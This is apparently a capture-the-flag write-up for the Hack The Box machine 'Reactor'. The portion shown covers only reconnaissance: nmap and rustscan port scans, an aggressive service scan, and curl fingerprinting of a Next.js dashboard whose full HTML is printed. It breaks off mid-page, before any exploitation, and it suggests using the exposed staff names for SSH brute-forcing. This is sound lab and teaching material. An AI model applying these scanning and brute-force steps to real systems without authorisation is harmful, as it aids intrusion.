---
tags:
  - SN_11
link: https://app.hackthebox.com/machines/Reactor
machine no.: 1
description: Easy·Linux
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/56868ca419111fc0721393a2ffa0cefe.png
solve date: 2026-06-01
solved: true
---
## Attack Chain Summary

![[Reactor summary.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 1.2 Verifying the Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11]
└─$ ping -c 4 TARGET_IP
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=226 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=231 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=230 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=230 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 226.044/229.166/231.097/1.883 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 The "Spearfishing" Scan (All Ports, High Speed)

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP`

**Breakdown:**

- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate 5000 -Pn TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-25 14:02 -0400
Warning: TARGET_IP giving up on port because retransmission cap hit (10).
Nmap scan report for TARGET_IP
Host is up (0.27s latency).
Not shown: 62530 closed tcp ports (reset), 3003 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 69.25 seconds
```

or 

**Command:** `rustscan -a TARGET_IP --ulimit 5000`

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ rustscan -a TARGET_IP --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open TARGET_IP:22
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-25 14:02 -0400
Initiating Ping Scan at 14:02
Scanning TARGET_IP [4 ports]
Completed Ping Scan at 14:02, 0.36s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:02
Completed Parallel DNS resolution of 1 host. at 14:02, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 14:02
Scanning TARGET_IP [1 port]
Discovered open port 22/tcp on TARGET_IP
Completed SYN Stealth Scan at 14:02, 2.29s elapsed (1 total ports)
Nmap scan report for TARGET_IP
Host is up, received echo-reply ttl 63 (0.37s latency).
Scanned at 2026-05-25 14:02:36 EDT for 2s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.34 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3812 (152.472KB)
```
<div align="center">
<br>
<br>
</div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
└─$ nmap -A -p 22,3000 TARGET_IP          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-31 04:51 -0400
Nmap scan report for TARGET_IP
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Sun, 31 May 2026 08:52:04 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Sun, 31 May 2026 08:52:07 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.98%I=7%D=5/31%Time=6A1BF6B6%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,24EA,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-S
SF:tate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x2
SF:0Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\
SF:r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nC
SF:ache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017
SF:175\r\nDate:\x20Sun,\x2031\x20May\x202026\x2008:52:04\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta
SF:\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\
SF:"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/
SF:><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20
SF:href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20
SF:src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\
SF:"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.
SF:js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptio
SF:ns,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rou
SF:ter-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetc
SF:h\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20n
SF:o-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Sun,
SF:\x2031\x20May\x202026\x2008:52:07\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20R
SF:SC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-
SF:Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x
SF:20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r
SF:\nDate:\x20Sun,\x2031\x20May\x202026\x2008:52:07\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3000/tcp)
HOP RTT       ADDRESS
1   215.32 ms 10.10.14.1
2   216.06 ms TARGET_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.84 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

| Port     | **Service**    | **Version**          | **Analysis**                                                                                                   |
| -------- | -------------- | -------------------- | -------------------------------------------------------------------------------------------------------------- |
| 22/tcp   | SSH            | OpenSSH 9.6p1 Ubuntu | Recent build; low direct exploit potential. Keep for post-exploitation access or credential stuffing.          |
| 3000/tcp | HTTP (Next.js) | Next.js              | Possible Primary attack route. Next.js apps may expose API routes, server actions, or misconfigured endpoints. |

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.2 Enumeration of Web Services

Navigate to `http://TARGET_IP:3000` in a browser

![[Pasted image 20260531160954.png]]

Navigating to `http://TARGET_IP:3000` in a browser reveals the primary attack surface: a fictional industrial control system dashboard titled **REACTORWATCH — Core Monitoring System v3.2.1**, branded under _Nuclear Dynamics Corp_, classified as `RESTRICTED`, and located at `SITE-7`.

The application presents itself as a reactor interface, displaying:

- **Core Status panel** — Reactor Power at 98.2%, Neutron Flux at 2.4E13, Control Rods at 42/50, and a Criticality reading of 1.0002.
- **Sensor widgets** — Core Temp (324°C), Pressure (155 bar), Coolant Flow (18.4 km³/h), and Turbine Output (1.21 GW).
- **System Logs panel** — A live event feed with severity-tagged entries (`OK`, `INFO`, `WARN`), timestamped and describing internal reactor operations.
- **On-Site Personnel panel** — A staff roster exposing three individuals with real-time presence status:

| Name                | Role                  | Status  |
| ------------------- | --------------------- | ------- |
| Dr. Elena Rodriguez | Lead Nuclear Engineer | ONLINE  |
| Marcus Kim          | Senior Technician     | ONLINE  |
| James Thompson      | Safety Officer        | OFFLINE |

The application also appears intentionally minimal:

- No authentication form
- No search functionality
- No visible API endpoints
- No user-controlled input

There's not much to work with.

**Key observations from a security perspective:**

- The **personnel panel is a high-value target** — names and roles are directly exposed and could serve as a username wordlist for SSH brute-forcing or login form attacks.
- The **System Logs panel** suggests a backend data source (database or log file). If the timestamps or log entries are driven by user-controllable parameters, this is a potential injection vector.
- The **status indicators** (NOMINAL badge, live sensor readings) imply the app is making periodic API calls to a backend — intercepting these with a proxy like Burp Suite may reveal undocumented API endpoints.
- The version string **v3.2.1** may correspond to a known vulnerable software release worth researching.

![[Pasted image 20260531162917.png]]
<div align="center">
<br>
<br>
</div>

#### 2.2.1 Version Fingerprinting — Next.js

With the web surface confirmed as a Next.js application on port 3000, the immediate priority was identifying the **exact framework version**. A precise version number dramatically narrows the CVE search space and may reveal a directly exploitable vulnerability.
<div align="center">
<br>
</div>

##### `curl` HEAD Request

A HEAD-only request was Issued to extract response headers without fetching the page body.

**Command:** `curl -sI http://TARGET_IP:3000/`

**Breakdown:**

- `-s`
    - **Description:** Silent mode flag
    - **Purpose:** Suppresses progress noise for clean output.
- `-I`
    - **Description:** HEAD request flag
    - **Purpose:** Requests only the HTTP response headers with no body — the fastest method to inspect server-disclosed framework metadata without the overhead of a full page fetch.
- `http://TARGET_IP:3000/`
    - **Description:** Target URL
    - **Purpose:** Points curl at the confirmed Next.js port identified during Nmap enumeration.

**Result:**

```bash
┌──(kali㉿kali)-[~/…/HTB/SN11/Reactor]
└─$ curl -sI http://TARGET_IP:3000/
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 4294967294
X-Powered-By: Next.js
Cache-Control: s-maxage=31536000, 
ETag: "p02u6gnhufd8t"
Content-Type: text/html; charset=utf-8
Content-Length: 17175
Date: Mon, 01 Jun 2026 08:47:48 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

Framework confirmed as **Next.js**, but `X-Powered-By` disclosed only the framework name with no version suffix. The headers did however yield two behavioural fingerprints: `x-nextjs-prerender: 1` is characteristic of **Next.js 14+ Partial Pre-Rendering (PPR)**, and `x-nextjs-stale-time: 4294967294` (2³²−2) is a known App Router constant introduced in **Next.js 14.2+**, narrowing the version window considerably.
<div align="center">
<br>
</div>

##### `curl` Body Fetch

**Command:** `curl -s http://TARGET_IP:3000/`

**Breakdown:**

- `curl`
    - **Description:** Command-line HTTP client
    - **Purpose:** Fetches the full HTML body of the target's root page for manual inspection of embedded framework metadata.
- `-s`
    - **Description:** Silent mode flag
    - **Purpose:** Suppresses progress output, producing clean output suitable for reading or piping into further tools.
- `http://TARGET_IP:3000/`
    - **Description:** Target URL
    - **Purpose:** The confirmed Next.js web service identified during port enumeration on port 3000.

**Result:** Full HTML body returned. The page source confirs a statically rendered Next.js App Router application via the presence of `self.__next_f` RSC payload blocks. No version string was embedded in the HTML output. However, two critical artefacts were extracted for later use:

```bash
┌──(kali㉿kali)-[~/…/HTB/SN11/Reactor]
└─$ curl -s http://TARGET_IP:3000/
<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script src="/_next/static/chunks/main-app-4fbb4b1f318e39a0.js" async=""></script><title>ReactorWatch | Core Monitoring System</title><meta name="description" content="Nuclear Reactor Core Monitoring Dashboard"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body><div><header class="header"><div class="logo"><div class="logo-icon"></div><div class="logo-text"><h1>REACTORWATCH</h1><span>CORE MONITORING SYSTEM v3.2.1</span></div></div><div class="status-badge"><div class="status-dot"></div><span>NOMINAL</span></div></header><div class="container"><div class="dashboard-grid"><div class="panel core-status"><div class="panel-header"><span class="panel-title">Core Status</span><div class="panel-indicator"></div></div><div class="core-visual"><div class="core-ring"></div><div class="core-ring"></div><div class="core-ring"></div><div class="core-center">OK</div></div><div class="core-stats"><div class="stat-item"><div class="stat-label">REACTOR POWER</div><div class="stat-value">98.2%</div></div><div class="stat-item"><div class="stat-label">NEUTRON FLUX</div><div class="stat-value">2.4E13</div></div><div class="stat-item"><div class="stat-label">CONTROL RODS</div><div class="stat-value">42/50</div></div><div class="stat-item"><div class="stat-label">CRITICALITY</div><div class="stat-value warning">1.0002</div></div></div></div><div class="panel metric-card"><div class="panel-header"><span class="panel-title">Core Temp</span><div class="panel-indicator"></div></div><div class="metric-value">324°<span class="metric-unit">C</span></div><div class="metric-bar"><div class="metric-bar-fill" style="width:65%"></div></div></div><div class="panel metric-card"><div class="panel-header"><span class="panel-title">Pressure</span><div class="panel-indicator"></div></div><div class="metric-value">155<span class="metric-unit">bar</span></div><div class="metric-bar"><div class="metric-bar-fill" style="width:72%"></div></div></div><div class="panel metric-card"><div class="panel-header"><span class="panel-title">Coolant Flow</span><div class="panel-indicator"></div></div><div class="metric-value caution">18.4<span class="metric-unit">k m³/h</span></div><div class="metric-bar"><div class="metric-bar-fill caution" style="width:84%"></div></div></div><div class="panel metric-card"><div class="panel-header"><span class="panel-title">Turbine Output</span><div class="panel-indicator"></div></div><div class="metric-value">1.21<span class="metric-unit">GW</span></div><div class="metric-bar"><div class="metric-bar-fill" style="width:91%"></div></div></div><div class="panel log-panel"><div class="panel-header"><span class="panel-title">System Logs</span><div class="panel-indicator"></div></div><div class="log-entries"><div class="log-entry"><span class="log-time">14:32:01</span><span class="log-level ok">OK</span><span class="log-message">Primary coolant loop operating within parameters</span></div><div class="log-entry"><span class="log-time">14:28:45</span><span class="log-level info">INFO</span><span class="log-message">Scheduled maintenance completed on turbine #2</span></div><div class="log-entry"><span class="log-time">14:15:22</span><span class="log-level warn">WARN</span><span class="log-message">Minor fluctuation detected in secondary loop pressure</span></div><div class="log-entry"><span class="log-time">14:02:18</span><span class="log-level ok">OK</span><span class="log-message">Control rod position calibration successful</span></div><div class="log-entry"><span class="log-time">13:45:33</span><span class="log-level info">INFO</span><span class="log-message">Shift change: Day crew reporting for duty</span></div></div></div><div class="panel staff-panel"><div class="panel-header"><span class="panel-title">On-Site Personnel</span><div class="panel-indicator"></div></div><div class="staff-list"><div class="staff-member"><div class="staff-avatar">DR</div><div class="staff-info"><div class="staff-name">Dr. Elena Rodriguez</div><div class="staff-role">Lead Nuclear Engineer</div></div><div class="staff-status online">ONLINE</div></div><div class="staff-member"><div class="staff-avatar">MK</div><div class="staff-info"><div class="staff-name">Marcus Kim</div><div class="staff-role">Senior Technician</div></div><div class="staff-status online">ONLINE</div></div><div class="staff-member"><div class="staff-avatar">JT</div><div class="staff-info"><div class="staff-name">James Thompson</div><div class="staff-role">Safety Officer</div></div><div class="staff-status offline">OFFLINE</div></div></div></div></div><footer class="footer">REACTORWATCH™ © 2025 NUCLEAR DYNAMICS CORP. | FACILITY: SITE-7 | CLASSIFICATION: RESTRICTED</footer></div></div><script src="/_next/static/chunks/webpack-db0a529a99835594.js" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"2:\"$Sreact.fragment\"\n3:I[5244,[],\"\"]\n4:I[3866,[],\"\"]\n5:I[6213,[],\"OutletBoundary\"]\n7:I[6213,[],\"MetadataBoundary\"]\n9:I[6213,[],\"ViewportBoundary\"]\nb:I[4835,[],\"\"]\n1:HL[\"/_next/static/css/414e1be982bc8557.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"L3bimJe_3LvBcFWAnK5L4\",\"p\":\"\",\"c\":[\"\",\"\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"__PAGE__\",{}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$2\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/414e1be982bc8557.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"children\":[\"$\",\"body\",null,{\"children\":[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":\"404\"}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],\"notFoundStyles\":[]}]}]}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$2\",\"c\",{\"children\":[[\"$\",\"div\",null,{\"children\":[[\"$\",\"header\",null,{\"className\":\"header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"logo\",\"children\":[[\"$\",\"div\",null,{\"className\":\"logo-icon\"}],[\"$\",\"div\",null,{\"className\":\"logo-text\",\"children\":[[\"$\",\"h1\",null,{\"children\":\"REACTORWATCH\"}],[\"$\",\"span\",null,{\"children\":\"CORE MONITORING SYSTEM v3.2.1\"}]]}]]}],[\"$\",\"div\",null,{\"className\":\"status-badge\",\"children\":[[\"$\",\"div\",null,{\"className\":\"status-dot\"}],[\"$\",\"span\",null,{\"children\":\"NOMINAL\"}]]}]]}],[\"$\",\"div\",null,{\"className\":\"container\",\"children\":[[\"$\",\"div\",null,{\"className\":\"dashboard-grid\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel core-status\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Core Status\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"core-visual\",\"children\":[[\"$\",\"div\",null,{\"className\":\"core-ring\"}],[\"$\",\"div\",null,{\"className\":\"core-ring\"}],[\"$\",\"div\",null,{\"className\":\"core-ring\"}],[\"$\",\"div\",null,{\"className\":\"core-center\",\"children\":\"OK\"}]]}],[\"$\",\"div\",null,{\"className\":\"core-stats\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-item\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-label\",\"children\":\"REACTOR POWER\"}],[\"$\",\"div\",null,{\"className\":\"stat-value\",\"children\":\"98.2%\"}]]}],[\"$\",\"div\",null,{\"className\":\"stat-item\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-label\",\"children\":\"NEUTRON FLUX\"}],[\"$\",\"div\",null,{\"className\":\"stat-value\",\"children\":\"2.4E13\"}]]}],[\"$\",\"div\",null,{\"className\":\"stat-item\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-label\",\"children\":\"CONTROL RODS\"}],[\"$\",\"div\",null,{\"className\":\"stat-value\",\"children\":\"42/50\"}]]}],[\"$\",\"div\",null,{\"className\":\"stat-item\",\"children\":[[\"$\",\"div\",null,{\"className\":\"stat-label\",\"children\":\"CRITICALITY\"}],[\"$\",\"div\",null,{\"className\":\"stat-value warning\",\"children\":\"1.0002\"}]]}]]}]]}],[\"$\",\"div\",null,{\"className\":\"panel metric-card\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Core Temp\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-value\",\"children\":[\"324°\",[\"$\",\"span\",null,{\"className\":\"metric-unit\",\"children\":\"C\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-bar\",\"children\":[\"$\",\"div\",null,{\"className\":\"metric-bar-fill\",\"style\":{\"width\":\"65%\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"panel metric-card\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Pressure\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-value\",\"children\":[\"155\",[\"$\",\"span\",null,{\"className\":\"metric-unit\",\"children\":\"bar\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-bar\",\"children\":[\"$\",\"div\",null,{\"className\":\"metric-bar-fill\",\"style\":{\"width\":\"72%\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"panel metric-card\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Coolant Flow\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-value caution\",\"children\":[\"18.4\",[\"$\",\"span\",null,{\"className\":\"metric-unit\",\"children\":\"k m³/h\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-bar\",\"children\":[\"$\",\"div\",null,{\"className\":\"metric-bar-fill caution\",\"style\":{\"width\":\"84%\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"panel metric-card\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"Turbine Output\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-value\",\"children\":[\"1.21\",[\"$\",\"span\",null,{\"className\":\"metric-unit\",\"children\":\"GW\"}]]}],[\"$\",\"div\",null,{\"className\":\"metric-bar\",\"children\":[\"$\",\"div\",null,{\"className\":\"metric-bar-fill\",\"style\":{\"width\":\"91%\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"panel log-panel\",\"children\":[[\"$\",\"div\",null,{\"className\":\"panel-header\",\"children\":[[\"$\",\"span\",null,{\"className\":\"panel-title\",\"children\":\"System Logs\"}],[\"$\",\"div\",null,{\"className\":\"panel-indicator\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entries\",\"children\":[[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"14:32:01\"}],[\"$\",\"span\",null,{\"className\":\"log-level ok\",\"children\":\"OK\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Primary coolant loop operating within parameters\"}]]}],[\"$\",\"div\",null,{\"className\":\"log-entry\",\"children\":[[\"$\",\"span\",null,{\"className\":\"log-time\",\"children\":\"14:28:45\"}],[\"$\",\"span\",null,{\"className\":\"log-level info\",\"children\":\"INFO\"}],[\"$\",\"span\",null,{\"className\":\"log-message\",\"children\":\"Scheduled maintenance completed on turbine 